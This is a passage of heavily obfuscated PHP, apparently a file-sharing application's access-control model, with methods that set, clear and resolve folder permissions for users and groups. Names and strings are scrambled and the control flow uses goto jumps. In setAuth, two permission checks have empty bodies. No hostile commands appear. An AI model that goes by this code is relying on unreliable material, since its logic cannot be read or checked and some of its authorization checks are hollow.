$this->field($a¶¡ˆÀØ™)->order($Bğ²Îß‚Âù[388])->where($aÜÃ§‡†Ğ›)->select(); $eĞø½êÉÎ‹ = array_to_keyvalue_group($E¯Åôáº”®, $Bğ²Îß‚Âù[390]); foreach ($cÎ…·ÈóŸ as $dÕœ¶À­†¤) { $aíÃ¹í‰é[$dÕœ¶À­†¤] = $eĞø½êÉÎ‹[$dÕœ¶À­†¤] ? $eĞø½êÉÎ‹[$dÕœ¶À­†¤] : array(); } goto fÁƒ¬Û–ğ®; e’î—ïİ‚å: if (count($bÕİÂÌå¼Î) == count($cÎ…·ÈóŸ)) { return $BÌòŸœä ? $bÕİÂÌå¼Î[$cÎ…·ÈóŸ[0]] : $bÕİÂÌå¼Î; } $a¶¡ˆÀØ™ = $Bğ²Îß‚Âù[1833]; $aÜÃ§‡†Ğ› = array($Bğ²Îß‚Âù[390] => array($Bğ²Îß‚Âù[7], $cÎ…·ÈóŸ)); goto BæÅÒÀ¿Ø¿; cÓë‹Óõš: if ($BÌòŸœä) { $cÎ…·ÈóŸ = array($cÎ…·ÈóŸ); } $bÕİÂÌå¼Î = array(); foreach ($cÎ…·ÈóŸ as $dÕœ¶À­†¤) { if (isset($aíÃ¹í‰é[$dÕœ¶À­†¤])) { $bÕİÂÌå¼Î[$dÕœ¶À­†¤] = $aíÃ¹í‰é[$dÕœ¶À­†¤]; } } goto e’î—ïİ‚å; dÃ¢‚˜œŸ: $Bğ²Îß‚Âù =& $_SERVER[Â€Á›¨õ]; static $aíÃ¹í‰é = array(); $BÌòŸœä = is_array($cÎ…·ÈóŸ) ? !1 : !0; goto cÓë‹Óõš; c÷Ú‹šÀ´: } public function setAuth($BÌ¨¨Õ×’õ, $f„ø½Ş“¥è) { goto aíõÎÜƒ¥; fÚËâ©Ò¸ª: if ($CÌ¨İÛÇÔæ != $dŠåÂóö¸) { $cìõåù“æ¾ = array($c¾í»½–Ã[1664] => $CÌ¨İÛÇÔæ); $Dæ¨’õÔ– = Model($c¾í»½–Ã[1746])->field($c¾í»½–Ã[1501])->where($cìõåù“æ¾)->select(); $Dæ¨’õÔ– = array_to_keyvalue($Dæ¨’õÔ–, $c¾í»½–Ã[33], $c¾í»½–Ã[1501]); } $EÄÙ–Šõ‹ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $D‚¤ ä“± = array(); goto d‰©ÉöêòÀ; b±ñáø×™Ü: if ($e™Ö‡±½…Ø[$c¾í»½–Ã[398]] != SourceModel::TYPE_GROUP) { return !1; } $dŠåÂóö¸ = 1; $CÌ¨İÛÇÔæ = $e™Ö‡±½…Ø[$c¾í»½–Ã[478]]; goto fÚËâ©Ò¸ª; aíõÎÜƒ¥: $c¾í»½–Ã =& $_SERVER[Â€Á›¨õ]; $e™Ö‡±½…Ø = Model($c¾í»½–Ã[1178])->sourceInfo($BÌ¨¨Õ×’õ); if (!$e™Ö‡±½…Ø) { return !1; } goto b±ñáø×™Ü; d‰©ÉöêòÀ: foreach ($f„ø½Ş“¥è as $CìÁ¢õÚÑ§) { if (!in_array($CìÁ¢õÚÑ§[$c¾í»½–Ã[398]], $EÄÙ–Šõ‹)) { show_json(LNG($c¾í»½–Ã[1834]), !1); } if ($CÌ¨İÛÇÔæ != $dŠåÂóö¸) { if ($CìÁ¢õÚÑ§[$c¾í»½–Ã[398]] == SourceModel::TYPE_GROUP) { } if ($CìÁ¢õÚÑ§[$c¾í»½–Ã[478]] != 0 && !in_array($CìÁ¢õÚÑ§[$c¾í»½–Ã[478]], $Dæ¨’õÔ–)) { } } if ($CìÁ¢õÚÑ§[$c¾í»½–Ã[478]] == 0) { $CìÁ¢õÚÑ§[$c¾í»½–Ã[398]] = SourceModel::TYPE_USER; } $D‚¤ ä“±[] = array($c¾í»½–Ã[390] => $BÌ¨¨Õ×’õ, $c¾í»½–Ã[398] => intval($CìÁ¢õÚÑ§[$c¾í»½–Ã[398]]), $c¾í»½–Ã[478] => intval($CìÁ¢õÚÑ§[$c¾í»½–Ã[478]]), $c¾í»½–Ã[1760] => intval($CìÁ¢õÚÑ§[$c¾í»½–Ã[1760]]) ? intval($CìÁ¢õÚÑ§[$c¾í»½–Ã[1760]]) : 0, $c¾í»½–Ã[1814] => intval($CìÁ¢õÚÑ§[$c¾í»½–Ã[1814]]) ? intval($CìÁ¢õÚÑ§[$c¾í»½–Ã[1814]]) : -1); } $this->where(array($c¾í»½–Ã[404] => $BÌ¨¨Õ×’õ))->delete(); $this->addAll($D‚¤ ä“±); goto a——†ğÑ‚ª; a——†ğÑ‚ª: return !0; goto aœ‡ÍˆÑÖï; aœ‡ÍˆÑÖï: } public function authClear($cã‹‘æİ¬“) { $Dï®ä¨›Œ =& $_SERVER[Â€Á›¨õ]; $AáêêøåÓğ = Model($Dï®ä¨›Œ[1178])->sourceInfo($cã‹‘æİ¬“); $fñ Ï‰±‚Ğ = array($cã‹‘æİ¬“); if ($AáêêøåÓğ[$Dï®ä¨›Œ[397]] == $Dï®ä¨›Œ[86]) { $bŸÒ—º‚±® = array($Dï®ä¨›Œ[548] => array($Dï®ä¨›Œ[507], $AáêêøåÓğ[$Dï®ä¨›Œ[481]] . $cã‹‘æİ¬“ . $Dï®ä¨›Œ[508])); $fñ Ï‰±‚Ğ = Model($Dï®ä¨›Œ[1178])->field($Dï®ä¨›Œ[404])->where($bŸÒ—º‚±®)->getField($Dï®ä¨›Œ[390], !0); $fñ Ï‰±‚Ğ[] = $cã‹‘æİ¬“; } $this->where(array($Dï®ä¨›Œ[404] => array($Dï®ä¨›Œ[405], $fñ Ï‰±‚Ğ)))->delete(); return !0; } public function getAllChildren($BØÜä²š) { goto D¸òÀ¹š“©; D‚Ê‚Œä: if ($C¼­½×½ÜØ[$e¯­áÊ¾è[472]] == $e¯­áÊ¾è[491] && $C¼­½×½ÜØ[$e¯­áÊ¾è[478]] != $fçÛŠÏÃ…ò) { $Cˆ¸Û²×ÛÒ = $this->groupChidldAllRootSource($C¼­½×½ÜØ[$e¯­áÊ¾è[478]]); } $C§ñŠ¹½‰ó = $this->field($e¯­áÊ¾è[390])->group($e¯­áÊ¾è[390])->select(); $C§ñŠ¹½‰ó = array_to_keyvalue($C§ñŠ¹½‰ó, $e¯­áÊ¾è[33], $e¯­áÊ¾è[390]); goto DŸïÚïËÙÖ; DŸïÚïËÙÖ: if (!$C§ñŠ¹½‰ó) { return array(); } $B»§ˆŠØÄ¡ = $e¯­áÊ¾è[1835]; $F‰Š°ÚªŠ˜ = array($e¯­áÊ¾è[390] => array($e¯­áÊ¾è[7], $C§ñŠ¹½‰ó), $e¯­áÊ¾è[417] => $e¯­áÊ¾è[491]); goto D¼ñ´¥™ùù; D¼ñ´¥™ùù: $A‹’·¾†É„ = Model($e¯­áÊ¾è[767])->field($B»§ˆŠØÄ¡)->where($F‰Š°ÚªŠ˜)->select(); $AçïŒÒÑãÀ = array($BØÜä²š); foreach ($A‹’·¾†É„ as $Cƒ÷İÊ“æ“) { foreach ($Cˆ¸Û²×ÛÒ as $C¿ÚâÜÈ˜•) { $BÕªÍŞè¦ = $e¯­áÊ¾è[47] . $C¿ÚâÜÈ˜• . $e¯­áÊ¾è[47]; $dÑ§†ø³µ = $Cƒ÷İÊ“æ“[$e¯­áÊ¾è[481]] . $Cƒ÷İÊ“æ“[$e¯­áÊ¾è[390]] . $e¯­áÊ¾è[47]; if (strstr($dÑ§†ø³µ, $BÕªÍŞè¦)) { $AçïŒÒÑãÀ[] = $Cƒ÷İÊ“æ“[$e¯­áÊ¾è[390]]; break; } } } goto dÄÖÀ„¼‘±; dÄÖÀ„¼‘±: return $this->sourceListAuth($AçïŒÒÑãÀ); goto d†ÁÙ˜®Æ…; déÍÑòÇ¸í: if ($C¼­½×½ÜØ[$e¯­áÊ¾è[398]] != SourceModel::TYPE_GROUP) { return array(); } $fçÛŠÏÃ…ò = 1; $Cˆ¸Û²×ÛÒ = array($BØÜä²š); goto D‚Ê‚Œä; D¸òÀ¹š“©: $e¯­áÊ¾è =& $_SERVER[Â€Á›¨õ]; $C¼­½×½ÜØ = Model($e¯­áÊ¾è[1178])->sourceInfo($BØÜä²š); if ($C¼­½×½ÜØ[$e¯­áÊ¾è[397]] != $e¯­áÊ¾è[86]) { return $this->sourceListAuth(array($BØÜä²š)); } goto déÍÑòÇ¸í; d†ÁÙ˜®Æ…: } private function sourceListAuth($Añ‹Ù”Õ²×) { goto bˆˆ·ç»–˜; EÑ‡¦î§ª: $f¼©ËõïİË = array(); $f¹ÍÌ¢ßåç = array(); foreach ($AÉÎå‘ as $dÖÖâóÓ·Ô) { goto DØ¶¶Á˜©ó; cÆÓ‹ŠÙîÛ: $fİî£ŸÄ² = count(explode($bÑ©Ÿ´©õ[8], trim($dÖÖâóÓ·Ô[$bÑ©Ÿ´©õ[489]], $bÑ©Ÿ´©õ[8]))); $f¹ÍÌ¢ßåç[] = $fİî£ŸÄ² + ($dÖÖâóÓ·Ô[$bÑ©Ÿ´©õ[29]] == $bÑ©Ÿ´©õ[76] ? 0 : 1000); goto BÚƒî©Î”¡; BŸÎÕ¾´½è: $dÖÖâóÓ·Ô[$bÑ©Ÿ´©õ[1836]] = $this->authTargetInfo($c¸¦‘±‘öÕ); $dÖÖâóÓ·Ô[$bÑ©Ÿ´©õ[489]] = rtrim($dÖÖâóÓ·Ô[$bÑ©Ÿ´©õ[484]], $bÑ©Ÿ´©õ[8]) . $bÑ©Ÿ´©õ[8] . ltrim($dÖÖâóÓ·Ô[$bÑ©Ÿ´©õ[489]], $bÑ©Ÿ´©õ[8]); $f¼©ËõïİË[] = $dÖÖâóÓ·Ô; goto cÆÓ‹ŠÙîÛ; DØ¶¶Á˜©ó: unset($dÖÖâóÓ·Ô[$bÑ©Ÿ´©õ[428]]); unset($dÖÖâóÓ·Ô[$bÑ©Ÿ´©õ[426]]); unset($dÖÖâóÓ·Ô[$bÑ©Ÿ´©õ[400]]); goto f®Üƒš£òÍ; f®Üƒš£òÍ: unset($dÖÖâóÓ·Ô[$bÑ©Ÿ´©õ[84]]); $c¸¦‘±‘öÕ = $f¬ß¿½—µœ[$dÖÖâóÓ·Ô[$bÑ©Ÿ´©õ[390]]]; if (!$c¸¦‘±‘öÕ) { continue; } goto BŸÎÕ¾´½è; BÚƒî©Î”¡: } goto aƒô“Å†¸; aƒô“Å†¸: array_multisort($f¹ÍÌ¢ßåç, SORT_ASC, $f¼©ËõïİË); return $f¼©ËõïİË; goto Cì•µƒôÙ; bˆˆ·ç»–˜: $bÑ©Ÿ´©õ =& $_SERVER[Â€Á›¨õ]; $AÉÎå‘ = Model($bÑ©Ÿ´©õ[1178])->sourceListInfo($Añ‹Ù”Õ²×, !0); $f¬ß¿½—µœ = $this->sourceAuthSelect($Añ‹Ù”Õ²×); goto EÑ‡¦î§ª; Cì•µƒôÙ: } private function groupChidldAllRootSource($b–ƒ×ãÍˆö) { $då’ «¥ =& $_SERVER[Â€Á›¨õ]; $e¿­·¬Š…Í = Model($då’ «¥[1837])->groupChildrenAll($b–ƒ×ãÍˆö); $fÈñƒ¡«î· = array($då’ «¥[472] => 0, $då’ «¥[478] => array($då’ «¥[7], $e¿­·¬Š…Í), $då’ «¥[398] => SourceModel::TYPE_GROUP); $eºÍà = Model($då’ «¥[767])->field($då’ «¥[390])->where($fÈñƒ¡«î·)->select(); $eºÍà = array_to_keyvalue($eºÍà, $då’ «¥[33], $då’ «¥[390]); return $eºÍà; } private function authTargetInfo($FÍ¡¥¥âî”) { goto cï‰š³Ã¨Å; dÚ ¢±±µÖ: $F”ùÅÛÄê¬ = 2 << 25; foreach ($FÍ¡¥¥âî” as $eƒÊ·¸âôÉ) { goto eÈìñ­½Ç ; FËÜÁÌÏÇÙ: if ($eƒÊ·¸âôÉ[$FÏ£¾Øë¸[398]] == SourceModel::TYPE_USER && $eƒÊ·¸âôÉ[$FÏ£¾Øë¸[478]] == $FÏ£¾Øë¸[491]) { $eÉº³ÑæÚ = 0; } $C§ëäœæóñ[] = $DÓµ±‘¤¤½[$FÏ£¾Øë¸[400]] + $eÉº³ÑæÚ; goto Bº¿…ŞŒî; DõÉõôËõ½: if (!$fÕÈßëÁƒˆ) { continue; } $fÕÈßëÁƒˆ[$FÏ£¾Øë¸[440]] = $DÓµ±‘¤¤½; $e²İÅçğºÏ[] = $fÕÈßëÁƒˆ; goto FĞÁïİçã’; FĞÁïİçã’: $eÉº³ÑæÚ = 0; if ($eƒÊ·¸âôÉ[$FÏ£¾Øë¸[398]] == SourceModel::TYPE_GROUP) { $eÉº³ÑæÚ = $F”ùÅÛÄê¬ * 2; } if ($eƒÊ·¸âôÉ[$FÏ£¾Øë¸[398]] == SourceModel::TYPE_USER) { $eÉº³ÑæÚ = $F”ùÅÛÄê¬; } goto FËÜÁÌÏÇÙ; eÈìñ­½Ç : $DÓµ±‘¤¤½ = Model($FÏ£¾Øë¸[1832])->listData($eƒÊ·¸âôÉ[$FÏ£¾Øë¸[1760]]); if (!$DÓµ±‘¤¤½) { continue; } if ($eƒÊ·¸âôÉ[$FÏ£¾Øë¸[398]] == SourceModel::TYPE_USER) { $fÕÈßëÁƒˆ = Model($FÏ£¾Øë¸[497])->getInfoSimpleOuter($eƒÊ·¸âôÉ[$FÏ£¾Øë¸[478]]); if ($fÕÈßëÁƒˆ[$FÏ£¾Øë¸[1501]] == $FÏ£¾Øë¸[1059]) { continue; } if ($fÕÈßëÁƒˆ[$FÏ£¾Øë¸[1501]] == $FÏ£¾Øë¸[491]) { $fÕÈßëÁƒˆ[$FÏ£¾Øë¸[28]] = LNG($FÏ£¾Øë¸[1838]); } } else { $fÕÈßëÁƒˆ = Model($FÏ£¾Øë¸[480])->getInfoSimple($eƒÊ·¸âôÉ[$FÏ£¾Øë¸[478]]); } goto DõÉõôËõ½; Bº¿…ŞŒî: } array_multisort($C§ëäœæóñ, SORT_DESC, $e²İÅçğºÏ); goto fš²Ê×·†; cï‰š³Ã¨Å: $FÏ£¾Øë¸ =& $_SERVER[Â€Á›¨õ]; $e²İÅçğºÏ = array(); $C§ëäœæóñ = array(); goto dÚ ¢±±µÖ; fš²Ê×·†: return $e²İÅçğºÏ; goto D£¿‰Ëó³œ; D£¿‰Ëó³œ: } public function getAllChildrenByUser($eøº¾³Ô², $f§¶½÷‰…) { goto Cñ½áÕ•¿ß; Cñ½áÕ•¿ß: $dó¹æ÷ÈÉ =& $_SERVER[Â€Á›¨õ]; $E„‘½ªÒ®Ô = Model($dó¹æ÷ÈÉ[501])->getInfo($f§¶½÷‰…); if (!$f§¶½÷‰… || !$eøº¾³Ô² || !$E„‘½ªÒ®Ô) { return array(); } goto Eœ½•­¯Ä‹; dŞ›ìŒ…: if ($a©‚º’ï±[$dó¹æ÷ÈÉ[472]] == $dó¹æ÷ÈÉ[491] && $a©‚º’ï±[$dó¹æ÷ÈÉ[478]] != $bçÚŞèá‰¯ && $this->groupContainUser($a©‚º’ï±[$dó¹æ÷ÈÉ[478]], $f§¶½÷‰…)) { foreach ($E„‘½ªÒ®Ô[$dó¹æ÷ÈÉ[1839]] as $A•¬Ï­ÀÂï) { $a•ï™ÅŞ = Model($dó¹æ÷ÈÉ[480])->getInfo($A•¬Ï­ÀÂï[$dó¹æ÷ÈÉ[1664]]); $CØ…îõ‹“™ = Model($dó¹æ÷ÈÉ[501])->getInfoSimpleOuter($f§¶½÷‰…); $CØ…îõ‹“™[$dó¹æ÷ÈÉ[440]] = $A•¬Ï­ÀÂï[$dó¹æ÷ÈÉ[400]]; if (Model($dó¹æ÷ÈÉ[1832])->authCheckAction($A•¬Ï­ÀÂï[$dó¹æ÷ÈÉ[400]][$dó¹æ÷ÈÉ[400]], $dó¹æ÷ÈÉ[1684])) { continue; } $AÎ¬Ä—‚™© = array($dó¹æ÷ÈÉ[28] => $dó¹æ÷ÈÉ[1453] . $a•ï™ÅŞ[$dó¹æ÷ÈÉ[28]], $dó¹æ÷ÈÉ[390] => $a•ï™ÅŞ[$dó¹æ÷ÈÉ[84]][$dó¹æ÷ÈÉ[390]], $dó¹æ÷ÈÉ[75] => KodIO::make($a•ï™ÅŞ[$dó¹æ÷ÈÉ[84]][$dó¹æ÷ÈÉ[390]]), $dó¹æ÷ÈÉ[472] => $dó¹æ÷ÈÉ[491], $dó¹æ÷ÈÉ[398] => $dó¹æ÷ÈÉ[990], $dó¹æ÷ÈÉ[29] => $dó¹æ÷ÈÉ[512], $dó¹æ÷ÈÉ[489] => $a•ï™ÅŞ[$dó¹æ÷ÈÉ[485]], $dó¹æ÷ÈÉ[1664] => $a•ï™ÅŞ[$dó¹æ÷ÈÉ[1664]], $dó¹æ÷ÈÉ[482] => $a•ï™ÅŞ[$dó¹æ÷ÈÉ[472]], $dó¹æ÷ÈÉ[1836] => array($CØ…îõ‹“™)); $eŠ»¤©š”Ğ[$AÎ¬Ä—‚™©[$dó¹æ÷ÈÉ[390]]] = $AÎ¬Ä—‚™©; } } $C¹ˆÀ›ò¨ù = array(); $F¤¢¬´Ó»Æ = $this->getAllChildren($eøº¾³Ô²); goto D¹•Ôñ¢äÓ; D¹•Ôñ¢äÓ: foreach ($F¤¢¬´Ó»Æ as $aÏ“¼¢Éòâ) { $E¸×Âã«øî = !1; foreach ($aÏ“¼¢Éòâ[$dó¹æ÷ÈÉ[1836]] as $B¡ã‚ñßã) { if ($B¡ã‚ñßã[$dó¹æ÷ÈÉ[1501]]) { if ($B¡ã‚ñßã[$dó¹æ÷ÈÉ[1501]] == $f§¶½÷‰…) { $E¸×Âã«øî = !0; break; } } if ($B¡ã‚ñßã[$dó¹æ÷ÈÉ[1664]]) { if ($this->groupContainUser($B¡ã‚ñßã[$dó¹æ÷ÈÉ[1664]], $f§¶½÷‰…)) { $E¸×Âã«øî = !0; break; } } } if ($E¸×Âã«øî) { $C¹ˆÀ›ò¨ù[] = $aÏ“¼¢Éòâ; } $D©ÏÓ§ĞãÌ = $aÏ“¼¢Éòâ[$dó¹æ÷ÈÉ[390]]; if (isset($eŠ»¤©š”Ğ[$D©ÏÓ§ĞãÌ])) { $aÏ“¼¢Éòâ[$dó¹æ÷ÈÉ[1836]][] = $eŠ»¤©š”Ğ[$D©ÏÓ§ĞãÌ][0]; $eŠ»¤©š”Ğ[$D©ÏÓ§ĞãÌ] = !1; } } $eŠ»¤©š”Ğ = array_filter(array_values($eŠ»¤©š”Ğ)); $C¹ˆÀ›ò¨ù = array_merge($eŠ»¤©š”Ğ, $C¹ˆÀ›ò¨ù); goto f·ø‹º³¡‰; Eœ½•­¯Ä‹: $a©‚º’ï± = Model($dó¹æ÷ÈÉ[1178])->sourceInfo($eøº¾³Ô²); $eŠ»¤©š”Ğ = array(); $bçÚŞèá‰¯ = 1; goto dŞ›ìŒ…; f·ø‹º³¡‰: return $C¹ˆÀ›ò¨ù; goto d°á¹§¶Œ§; d°á¹§¶Œ§: } public function setAllChildrenByUser($AµÖç¦î–, $a¦„Õ¬­ô‡, $f‘Úˆì¤Ä) { $aÛäĞ±á–Ğ =& $_SERVER[Â€Á›¨õ]; $f¯÷ñ¹Ñš = $this->getAllChildrenByUser($AµÖç¦î–, $a¦„Õ¬­ô‡); if (!$f‘Úˆì¤Ä || !$f¯÷ñ¹Ñš) { return !1; } foreach ($f¯÷ñ¹Ñš as $CÊ±­ë‚±) { $a‰ŞË«—ƒò = array(); foreach ($CÊ±­ë‚±[$aÛäĞ±á–Ğ[1836]] as $BØ¬ã²Æµ£) { $Aä‚íÉ”Ú¶ = $BØ¬ã²Æµ£[$aÛäĞ±á–Ğ[440]]; $EŒ±ÄŠ¸Ëä = $BØ¬ã²Æµ£[$aÛäĞ±á–Ğ[1501]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $d¦­ã¯Ó‘ = $BØ¬ã²Æµ£[$aÛäĞ±á–Ğ[1501]] ? $BØ¬ã²Æµ£[$aÛäĞ±á–Ğ[1501]] : $BØ¬ã²Æµ£[$aÛäĞ±á–Ğ[1664]]; if ($BØ¬ã²Æµ£[$aÛäĞ±á–Ğ[1501]] && $BØ¬ã²Æµ£[$aÛäĞ±á–Ğ[1501]] == $a¦„Õ¬­ô‡) { continue; } $a‰ŞË«—ƒò[] = array($aÛäĞ±á–Ğ[390] => $CÊ±­ë‚±[$aÛäĞ±á–Ğ[390]], $aÛäĞ±á–Ğ[398] => $EŒ±ÄŠ¸Ëä, $aÛäĞ±á–Ğ[478] => intval($d¦­ã¯Ó‘), $aÛäĞ±á–Ğ[1760] => isset($Aä‚íÉ”Ú¶[$aÛäĞ±á–Ğ[388]]) ? intval($Aä‚íÉ”Ú¶[$aÛäĞ±á–Ğ[388]]) : 0, $aÛäĞ±á–Ğ[1814] => isset($Aä‚íÉ”Ú¶[$aÛäĞ±á–Ğ[1814]]) ? intval($Aä‚íÉ”Ú¶[$aÛäĞ±á–Ğ[1814]]) : -1); } $a‰ŞË«—ƒò[] = array($aÛäĞ±á–Ğ[390] => $CÊ±­ë‚±[$aÛäĞ±á–Ğ[390]], $aÛäĞ±á–Ğ[398] => SourceModel::TYPE_USER, $aÛäĞ±á–Ğ[478] => intval($a¦„Õ¬­ô‡), $aÛäĞ±á–Ğ[1760] => intval($f‘Úˆì¤Ä), $aÛäĞ±á–Ğ[1814] => -1); $this->where(array($aÛäĞ±á–Ğ[404] => $CÊ±­ë‚±[$aÛäĞ±á–Ğ[390]]))->delete(); $this->addAll($a‰ŞË«—ƒò); } return !0; } public function get($AÇ×ª‰ö¹) { $eµÌğ¹ˆØ¤ = $this->getSourceList(array($AÇ×ª‰ö¹), !0); return $eµÌğ¹ˆØ¤[0]; } public function getSourceList($cæŠÃ†š÷Í, $bœ«œÇÉìÊ = false, $EĞ‰õ‰ŸÈ = false) { goto eÏ”è–å †; f«Ã¹¾Çƒ: $CÎ›ô—œ³ª = array(); foreach ($bœ«œÇÉìÊ as $DÚ»ÑÓ½‘ => $e‡•âù½£) { if ($cÃ…¯õÉˆ) { $CÎ›ô—œ³ª[$DÚ»ÑÓ½‘] = $BëßëÆ©¸Ú; continue; } $CÎ›ô—œ³ª[$DÚ»ÑÓ½‘] = $this->makeSourceAuth($e‡•âù½£, $dê‘œáÉÚ¸, $EĞ‰õ‰ŸÈ); } return $CÎ›ô—œ³ª; goto AÏ†ğ¶áŒ; A—ÔÊÛ†Â­: $EÅœ®­„¹¼ = $this->sourceAuthSelect($e†Ì„İïá); $dê‘œáÉÚ¸ = array(); foreach ($e†Ì„İïá as $DÚ»ÑÓ½‘) { if (isset($EÅœ®­„¹¼[$DÚ»ÑÓ½‘])) { $dê‘œáÉÚ¸[$DÚ»ÑÓ½‘] = $EÅœ®­„¹¼[$DÚ»ÑÓ½‘]; } } goto fÛôî½©ï½; fÛôî½©ï½: $cÃ…¯õÉˆ = $this->userIsRoot($EĞ‰õ‰ŸÈ); $AÂì™¢ßª = AuthModel::authAll(); $BëßëÆ©¸Ú = array($bôé‡†Øâ³[401] => $AÂì™¢ßª, $bôé‡†Øâ³[1841] => array($bôé‡†Øâ³[406] => 0, $bôé‡†Øâ³[1670] => $AÂì™¢ßª, $bôé‡†Øâ³[407] => LNG($bôé‡†Øâ³[1842]), $bôé‡†Øâ³[1685] => $bôé‡†Øâ³[1843])); goto f«Ã¹¾Çƒ; C›…«ƒ¨Áğ: if (!$bœ«œÇÉìÊ && count($cæŠÃ†š÷Í) == 1) { $bœ«œÇÉìÊ = array(); $bœ«œÇÉìÊ[$cæŠÃ†š÷Í[0]] = $Bî¦ÁÙîëî->sourceInfo($cæŠÃ†š÷Í[0]); } if (!$bœ«œÇÉìÊ) { $cÛğ„•£íš = array($bôé‡†Øâ³[404] => array($bôé‡†Øâ³[405], $cæŠÃ†š÷Í)); $bœ«œÇÉìÊ = $Bî¦ÁÙîëî->field($bôé‡†Øâ³[1840])->where($cÛğ„•£íš)->select(); $bœ«œÇÉìÊ = array_to_keyvalue($bœ«œÇÉìÊ, $bôé‡†Øâ³[390]); } $e†Ì„İïá = $cæŠÃ†š÷Í; goto aÙ¬–ÛêÊ¦; eÏ”è–å †: $bôé‡†Øâ³ =& $_SERVER[Â€Á›¨õ]; if (!$cæŠÃ†š÷Í) { return array(); } $Bî¦ÁÙîëî = Model($bôé‡†Øâ³[1178]); goto C›…«ƒ¨Áğ; aÙ¬–ÛêÊ¦: foreach ($bœ«œÇÉìÊ as $fƒæ™öª„é => $eË©ùĞİó) { $a‡¿‰Á–÷ë = $Bî¦ÁÙîëî->parentLevelArray($eË©ùĞİó[$bôé‡†Øâ³[481]]); $e†Ì„İïá = array_merge($e†Ì„İïá, array($fƒæ™öª„é), array_reverse($a‡¿‰Á–÷ë)); } $e†Ì„İïá = array_values(array_unique($e†Ì„İïá)); if (!$e†Ì„İïá) { return array(); } goto A—ÔÊÛ†Â­; AÏ†ğ¶áŒ: } public function authDeepCheck($câ‡õ©í¿ê, $B‰À¸¹Ä£ = false) { goto E‡œ§ŞÁë; E‡œ§ŞÁë: $Añ¥Ç¿¹¥… =& $_SERVER[Â€Á›¨õ]; $B‰À¸¹Ä£ = $B‰À¸¹Ä£ ? $B‰À¸¹Ä£ : USER_ID; $c¤êÔ Ğ¯ã = $this->makeAuthDeep($B‰À¸¹Ä£); goto fà†«²¸ùÖ; fà†«²¸ùÖ: if (!in_array($câ‡õ©í¿ê, $c¤êÔ Ğ¯ã[$Añ¥Ç¿¹¥…[1844]])) { return !1; } $c‚ä›Ò«Àª = array(); foreach ($c¤êÔ Ğ¯ã[$Añ¥Ç¿¹¥…[1845]] as $cõÒÍÛ‡Ğ° => $dõÏ¸˜Ãèˆ) { if (!in_array($câ‡õ©í¿ê, $dõÏ¸˜Ãèˆ)) { continue; } $c‚ä›Ò«Àª[] = $cõÒÍÛ‡Ğ°; } goto CÌà„¤›Ş§; CÌà„¤›Ş§: if (!$c‚ä›Ò«Àª) { return !1; } $b»éè¬æ†ï = $c‚ä›Ò«Àª ? $c‚ä›Ò«Àª[0] : $câ‡õ©í¿ê; return array($Añ¥Ç¿¹¥…[401] => -1, $Añ¥Ç¿¹¥…[440] => array($Añ¥Ç¿¹¥…[406] => $Añ¥Ç¿¹¥…[1059], $Añ¥Ç¿¹¥…[1670] => $Añ¥Ç¿¹¥…[491], $Añ¥Ç¿¹¥…[407] => LNG($Añ¥Ç¿¹¥…[1846]), $Añ¥Ç¿¹¥…[1685] => $Añ¥Ç¿¹¥…[1847]), $Añ¥Ç¿¹¥…[1848] => LNG($Añ¥Ç¿¹¥…[1849]), $Añ¥Ç¿¹¥…[1850] => $this->sourceAuthInfo($b»éè¬æ†ï)); goto fÔØ‰ÔòÅÓ; fÔØ‰ÔòÅÓ: } protected function makeAuthDeep($b¡Æ£¨õÌ = false) { goto eÊø‚Ş‹õè; eÊø‚Ş‹õè: $D§ã¦…õò =& $_SERVER[Â€Á›¨õ]; static $DòÎÀğ‚†¬ = array(); $b¡Æ£¨õÌ = $b¡Æ£¨õÌ ? $b¡Æ£¨õÌ : USER_ID; goto FÓøÍëñ‚; aéÃğ å‚: $BÛæçØé ò = array(); $Fœá•ÊœÌ‹ = array(); $aæ·¨»ôƒ = array(); goto a±äÏÌÓèë; FÓøÍëñ‚: if (isset($DòÎÀğ‚†¬[$b¡Æ£¨õÌ])) { return $DòÎÀğ‚†¬[$b¡Æ£¨õÌ]; } $Dî”¾Æ™ = Model($D§ã¦…õò[1851])->listData(); $D¼âøóŞæõ = array(); goto f‰ÇÀ”•ÙÃ; f—š´®ƒê’: $aò©íãï = array_to_keyvalue_group($aÎ™ÌË ëó, $D§ã¦…õò[390]); foreach ($aò©íãï as $cŸ´ÇÁ°¯î => $fÑÏÛ˜ö‚†) { $a¶µ™ÚÉÕ° = $this->authArrayCheck($fÑÏÛ˜ö‚†, $b¡Æ£¨õÌ); if ($a¶µ™ÚÉÕ°[$D§ã¦…õò[401]] > 0) { $cã¸ÑğéÜ¤[] = $cŸ´ÇÁ°¯î . $D§ã¦…õò[33]; } } $Aó§¹­Œî‡ = array(); goto D‹Å¶ÕËÊØ; A†áóğĞÉÚ: if ($Eùï»ÌîÓ¶) { $dº½“ëÈ¢³ = array(array($D§ã¦…õò[398] => SourceModel::TYPE_USER, $D§ã¦…õò[478] => $b¡Æ£¨õÌ), array($D§ã¦…õò[398] => SourceModel::TYPE_GROUP, $D§ã¦…õò[478] => array($D§ã¦…õò[405], $Eùï»ÌîÓ¶)), $D§ã¦…õò[932] => $D§ã¦…õò[1752]); } $aÎ™ÌË ëó = $this->field($D§ã¦…õò[1852])->where($dº½“ëÈ¢³)->select(); $cã¸ÑğéÜ¤ = array(); goto f—š´®ƒê’; f‰ÇÀ”•ÙÃ: foreach ($Dî”¾Æ™ as $AÌÜˆùŠŒ ) { if ($AÌÜˆùŠŒ [$D§ã¦…õò[400]] == 0 && $AÌÜˆùŠŒ [$D§ã¦…õò[1686]] == $D§ã¦…õò[86]) { $D¼âøóŞæõ[] = $AÌÜˆùŠŒ [$D§ã¦…õò[388]]; } } $Eùï»ÌîÓ¶ = $this->userGroupParents($b¡Æ£¨õÌ); $dº½“ëÈ¢³ = array($D§ã¦…õò[398] => SourceModel::TYPE_USER, $D§ã¦…õò[478] => $b¡Æ£¨õÌ); goto A†áóğĞÉÚ; CçÕ¾”ê½: $d·óÖåñŸÃ = $CÌåÑÆæÓ´; foreach ($d·óÖåñŸÃ as $c›¨ÂäÑëó) { $f´–‘ˆšôÉ = $bŠÌÕÎøê->getInfo($c›¨ÂäÑëó); $B„öˆ®—‰• = $c‹ãšùÖà¤->parentLevelArray($f´–‘ˆšôÉ[$D§ã¦…õò[481]]); $CÌåÑÆæÓ´ = array_merge($CÌåÑÆæÓ´, $B„öˆ®—‰•); } $CÌåÑÆæÓ´ = 